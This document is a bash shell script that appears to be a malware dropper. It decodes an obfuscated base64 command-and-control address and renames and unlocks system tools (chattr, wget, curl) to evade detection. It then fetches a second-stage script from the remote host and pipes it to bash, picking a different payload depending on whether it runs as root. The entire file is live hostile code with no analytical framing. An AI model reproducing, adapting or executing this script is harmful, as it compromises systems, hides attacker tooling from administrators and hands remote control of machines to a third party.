#!/bin/bash
#variables

# 3451483894
domain=$(echo MzQ1MTQ4Mzg5NAo=|base64 -d)

# http://3451483894/b2f628
mainurl=$(echo aHR0cDovLzM0NTE0ODM4OTQvYjJmNjI4Cg==|base64 -d)
#mv command
if [ -x /bin/chattr ];then
    mv /bin/chattr /bin/zzhcht
elif [ -x /usr/bin/chattr ];then
    mv /usr/bin/chattr /usr/bin/zzhcht
fi
if [ -x /bin/zzhcht ];then
    export CHATTR=/bin/zzhcht
elif [ -x /usr/bin/zzhcht ];then
    export CHATTR=/usr/bin/zzhcht
else
    export CHATTR=chattr
fi
for wcmd in  wget wge wd1 wget1 wdt wdz xget
do
if [ -x "/bin/$wcmd" ];then
  ${CHATTR} -ia "/bin/$wcmd"
  export WGET_CMD="/bin/$wcmd"
  mv "/bin/$wcmd" /bin/wls  && export WGET_CMD="/bin/wls"
elif [ -x "/usr/bin/$wcmd" ];then
  ${CHATTR} -ia "/usr/bin/$wcmd"
  export WGET_CMD="/usr/bin/$wcmd"
  mv "/usr/bin/$wcmd" /usr/bin/wls && export WGET_CMD="/usr/bin/wls"
fi
done
for ccmd in curl cd1 cdz cur TNTcurl curltnt curl1 xcurl
do
if [ -x "/bin/$ccmd" ];then
  ${CHATTR} -ia "/bin/$ccmd"
  export CURL_CMD="/bin/$ccmd"
  mv "/bin/$ccmd" /bin/cls  && export CURL_CMD="/bin/cls"
elif [ -x "/usr/bin/$ccmd" ];then
  ${CHATTR} -ia "/usr/bin/$ccmd"
  export CURL_CMD="/usr/bin/$ccmd"
  mv "/usr/bin/$ccmd" /usr/bin/cls && export CURL_CMD="/usr/bin/cls"
fi
done
if [ -x "/bin/wls" ];then
    export WGET_CMD="/bin/wls"
elif [ -x "/usr/bin/wls" ];then
    export WGET_CMD="/usr/bin/wls"
else
    if [ $(command -v yum) ];then
        rpm -e --nodeps wget
        yum remove -y wget
        yum install -y wget
    else
        apt-get remove -y wget
        apt-get install -y wget
    fi
    mv /bin/wget /bin/wls || mv /usr/bin/wget /usr/bin/wls
    if [ -f /bin/wls ];then
        export WGET_CMD="/bin/wls"
    elif [ -f /usr/bin/wls ];then
        export WGET_CMD="/usr/bin/wls"
    fi
fi
if [ -x "/usr/bin/cls" ];then
    export CURL_CMD="/usr/bin/cls"
elif [ -x "/bin/cls" ];then
    export CURL_CMD="/bin/cls"
else
    if [ $(command -v yum) ];then
        rpm -e --nodeps curl
        yum remove curl
        yum install -y curl
    else
        apt-get remove curl
        apt-get install -y  curl
    fi
    mv /bin/curl /bin/cls || mv /usr/bin/curl /usr/bin/cls
    if [ -f /bin/cls ];then
        export CURL_CMD="/bin/cls"
    elif [ -f /usr/bin/cls ];then
        export CURL_CMD="/usr/bin/cls"
    fi
fi

CSIZE=$(du -sk ${CURL_CMD}|awk '{print $1}')
WSIZE=$(du -sk ${WGET_CMD}|awk '{print $1}')
if [ "$(id -u)" = "0" ];then
    if (( "$CSIZE" > 100 ))
	then
        ${CURL_CMD} -fsSL ${mainurl}/d/ar.sh |bash
	elif (( "$WSIZE" > 100 ))
	then
	${WGET_CMD} -q -O- ${mainurl}/d/ar.sh |bash
	else
	python -c "import urllib2; print urllib2.urlopen('${mainurl}/d/ar.sh').read()" >/tmp/ar.sh;chmod +x /tmp/ar.sh;sh /tmp/ar.sh
	fi
else
    if (( "$CSIZE" > 100 ))
	then
        ${CURL_CMD} -fsSL ${mainurl}/d/ai.sh |bash
	elif (( "$WSIZE" > 100 ))
	then
	${WGET_CMD} -q -O- ${mainurl}/d/ai.sh |bash
	else
	python -c "import urllib2; print urllib2.urlopen('${mainurl}/d/ai.sh').read()" >/tmp/ai.sh;chmod +x /tmp/ai.sh;sh /tmp/ai.sh
	fi
fi
